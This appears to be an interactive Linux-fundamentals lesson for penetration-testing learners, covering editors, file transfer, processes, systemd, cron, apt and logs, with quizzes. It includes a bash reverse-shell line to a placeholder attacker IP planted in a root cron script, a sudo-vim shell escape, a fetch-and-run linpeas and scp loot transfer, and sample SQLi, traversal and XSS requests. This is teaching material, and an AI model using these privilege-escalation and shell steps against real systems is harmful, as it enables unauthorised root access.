the concepts
Concept 01 // Text editors

📝 Nano vs Vim — editing files without a mouse

So far we've only written files with echo and >>. Good luck editing a 500-line config that way. Enter terminal text editors.

📝 Think of it like Notepad vs Photoshop, but for terminals

Nano is Notepad — open a file, type stuff, save, exit. Zero learning curve. Vim is Photoshop — insane power, but you spend the first hour unable to figure out how to quit. (:q!. You're welcome.)

😇 Nano — friendly mode

nano myfile.txt
  • Ctrl+O — save (write out)
  • Ctrl+X — exit
  • Ctrl+W — search
  • Ctrl+K — cut line
  • Ctrl+U — paste

The ^ in nano's bottom bar means Ctrl.

😤 Vim — power mode

vim myfile.txt
  • i — insert mode (start typing)
  • Esc — back to normal mode
  • :w — save
  • :q — quit
  • :wq — save and quit
  • :q! — quit WITHOUT saving (abort)
  • /pattern — search
🎯 For this room, just use nano. Vim is a rabbit hole worth going down later (THM has a dedicated room). For now, nano handles 100% of what you need.
🧠 Brain Power
Why do pentesters sometimes prefer vim on a remote box even though nano is easier?

Three reasons: (1) vim is on EVERY Linux box by default — even minimal containers. Nano isn't always there. (2) vim can spawn shells. If sudo -l shows you can run vim as root → sudo vim then :!bash → root shell. GTFOBins has the full list. (3) vim works over slow/laggy SSH connections better than nano's redraw-the-whole-screen approach.

Concept 02 // Moving files between machines

📦 wget, scp, and python's http.server

Three tools that every pentester has in muscle memory. Each solves "how do I get file X onto/off of machine Y?" in a different situation.

⬇️ wget

Pull a file from any HTTP/HTTPS URL onto this machine.

wget http://10.10.1.5:8000/lp.sh

💡 Run it on the TARGET. The target pulls from your server.

📤 scp

Push/pull files over SSH. Needs valid SSH creds on the other end.

scp file.txt user@10.10.1.5:/tmp/

💡 Encrypted. Two-way. Best for loot exfil.

🐍 python3 -m http.server

Turn any directory into a web server in 2 seconds flat.

python3 -m http.server 8000

💡 Run on YOUR box. Target then wget's from you.

The classic pentest file-shuttle combo

# ------- On your attack box (you) ------- cd /tools python3 -m http.server 8000 # Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... # ------- On the target box (compromised) ------- wget http://YOUR_IP:8000/linpeas.sh -O /tmp/lp.sh chmod +x /tmp/lp.sh /tmp/lp.sh | tee /tmp/lp-output.txt # ------- Send loot back to attacker ------- scp /tmp/lp-output.txt you@YOUR_IP:/loot/target1.txt
🚨 Don't run http.server on a public IP. Anyone on the internet can grab every file in that directory. CTF networks = fine. Your home IP = stop.
Concept 03 // Processes 101

🔢 PIDs, ps, kill, signals

Every running program on Linux = one process with one unique PID. To manage the system, you need to see what's running and stop (or start) specific ones.

📝 Think of PIDs like hospital wristbands

Every program that's running gets a unique number. "Who is PID 1337?" "Oh that's Apache." Doctors refer to patients by their wristband number. Linux refers to processes by their PID.

Interactive: a live-ish process table

Here's what ps aux looks like. Click a PID's KILL button to see it disappear — like on the real box.

USERPID%CPU%MEMCOMMAND
root10.00.4/lib/systemd/systemd
root2450.11.2/usr/sbin/sshd -D
root3120.00.8/usr/sbin/cron -f
you13370.23.1/usr/bin/python3 exploit.py
you150115.20.7./background.sh
www-data20440.02.4/usr/sbin/apache2 -k start

The kill signals you actually need to know

SIGTERM (15)

kill 1337 — polite. Asks the process to clean up and exit. Default.

SIGKILL (9)

kill -9 1337 — rude. Kernel kills it. No cleanup. Use when TERM is ignored.

SIGSTOP

kill -SIGSTOP 1337 — pause. Process freezes mid-execution. Resume with SIGCONT.

💡 Interview trivia: SIGKILL is the only signal a process cannot catch, block, or ignore. That's why it's the nuclear option.

Background & foreground

# Launch in background with & ./long_scan.sh & # [1] 19802  ← job number, PID # Or: run in foreground, pause with Ctrl+Z, then background ./long_scan.sh # (hit Ctrl+Z to pause) bg # resume in background fg # bring back to foreground jobs # list all background jobs in THIS shell
Concept 04 // Services at boot

⚙️ systemd — making things start automatically

Some programs need to run every time the machine boots. Web servers, SSH daemons, databases. That's systemd's job.

# The 5 verbs you'll actually type: sudo systemctl start apache2 # start NOW sudo systemctl stop apache2 # stop NOW sudo systemctl enable apache2 # auto-start at boot sudo systemctl disable apache2 # don't auto-start at boot systemctl status apache2 # is it running? when did it start?
💡 The classic rookie mistake: systemctl enable apache2 does NOT start it. Enable = "next reboot, turn on." Use enable --now to do both in one go.
Concept 05 // Automation

⏰ cron — schedule anything, forever

The robot that wakes up every minute, checks a list of scheduled jobs, and runs anything that's due. Beloved by admins. Worshipped by attackers.

📝 Think of it like setting an alarm, but the alarm runs bash commands

You tell cron: "Every Monday at 3:00 AM, run backup.sh." Cron remembers. Cron does it. Forever. Even if you forget, it doesn't.

The 5 time fields

Every cron line = 5 numbers + 1 command. Left to right: minute, hour, day-of-month, month, day-of-week.

🧪 Click into any field and change the value. See the cron line + plain English translation update live.

0 3 * * * /usr/bin/backup.sh
At minute 0 of hour 3 (3:00 AM), every day.
Daily 3 AM Every 5 min Every 12 hours Weekdays 9 AM 1st of month Every minute 😱

Editing YOUR crontab

crontab -e # open MY crontab in your default editor crontab -l # print MY crontab crontab -r # delete MY crontab (careful)
🚨 Why cron is a privesc goldmine: Cron jobs often run as root. If you (as a low-priv user) can WRITE to a script that cron runs as root → you can add a reverse-shell line → on the next cron tick, you're root. Always enumerate /etc/crontab, /etc/cron.d/, and /etc/cron.{hourly,daily,weekly,monthly}/ when hunting privesc. Full methodology →
🧠 Brain Power
A dev sets up a backup cron job:
*/5 * * * * /home/alice/backup.sh
Later, Alice chmod 777's backup.sh because "it's just a backup script." The cron line runs as root. You landed on the box as user "bob." What happens next?

You append one line to the end of backup.sh:

bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

Within 5 minutes, cron runs that script as root. Your netcat listener catches a reverse shell. UID = 0. You didn't exploit a CVE, crack a password, or abuse a kernel bug. You just read the crontab and the permissions. That's 80% of Linux privesc in real life.

Concept 06 // Package management

📦 apt — installing software safely

On Debian, Ubuntu, Kali, Parrot — apt is how you install, update, and remove software. Every Linux user types sudo apt install ... a thousand times.

# The daily driver sudo apt update # refresh package catalog sudo apt upgrade -y # apply all updates sudo apt install nmap # install a new package sudo apt remove nmap # uninstall sudo apt autoremove # clean up orphaned dependencies apt search <term> # find a package by name apt show <pkg> # details about a package

Repositories & GPG trust

apt doesn't install random tarballs. Every package comes from a repository listed in /etc/apt/sources.list, and every repo is signed with a GPG key your system trusts. If the signature fails, install fails.

cat /etc/apt/sources.list # main repos ls /etc/apt/sources.list.d/ # extra repos (third-party) apt-key list # trusted keys (legacy) ls /etc/apt/keyrings/ # trusted keys (modern)
⚠️ Never curl | sudo bash random install scripts. You're trusting that URL — and any redirects it followed — with root on your machine. Prefer adding a proper repo + GPG key, or use apt directly.
Concept 07 // Log files

📝 /var/log — the server's diary

Everything the system does ends up in a log somewhere. Learning to read logs is the single most useful defensive skill — and a top-tier offensive enumeration skill.

Interactive: hover each line to spot the bug

Here's a snippet of /var/log/apache2/access.log. Hover each request and spot what's suspicious.

192.168.1.50 - - [22/Apr/2026:13:40:01] "GET / HTTP/1.1" 200 1843
192.168.1.50 - - [22/Apr/2026:13:40:03] "GET /login.php HTTP/1.1" 200 912
185.220.101.7 - - [22/Apr/2026:13:40:15] "GET /login.php?user=admin'+OR+1=1-- HTTP/1.1" 200 2847
185.220.101.7 - - [22/Apr/2026:13:40:18] "GET /download?f=../../../etc/passwd HTTP/1.1" 404 312
185.220.101.7 - - [22/Apr/2026:13:40:22] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 1203
192.168.1.50 - - [22/Apr/2026:13:40:30] "GET /about HTTP/1.1" 200 556

The red lines? All from the same IP 185.220.101.7 (which happens to be a known Tor exit node). Three different attack patterns in ten seconds. A real SOC analyst sees this and fires off an incident ticket.

The logs you care about most

🔑 /var/log/auth.log

Every login, sudo, SSH attempt. First stop when investigating an auth breach.

🌐 /var/log/apache2/access.log

Every single HTTP request hitting your web server. Gold for attack detection.

🛡️ /var/log/fail2ban.log

Who got blocked for brute-forcing. Also reveals if you're being scanned.

📋 /var/log/syslog

Catch-all for system events. cron runs, service restarts, kernel warnings.

🎯 Question 1 — cron time fields

What does this crontab line do?
*/15 9-17 * * 1-5 /usr/bin/ping-check.sh
Runs every 15 minutes, forever, any day.
Runs every 15 minutes between 9 AM and 5 PM on weekdays (Mon–Fri).
Runs once at 9:15 AM on the first Monday of each month.
Runs every 15 hours on weekdays.

🎯 Question 2 — systemctl

You want nginx to start NOW and also auto-start every reboot. What's the one command?
systemctl start nginx
systemctl enable nginx
systemctl enable --now nginx
systemctl restart nginx --at-boot

🎯 Question 3 — the privesc classic

You're www-data on a box. You spot this line in /etc/crontab:
*/2 * * * * root /opt/cleanup.sh
Running ls -l /opt/cleanup.sh shows -rwxrwxrwx 1 root root ... cleanup.sh. What do you do?
Nothing — cron won't let me touch root files.
Run sudo cleanup.sh.
Append a reverse shell to cleanup.sh, then wait 2 minutes for cron to run it as root.
Report the bug to the admin and move on.
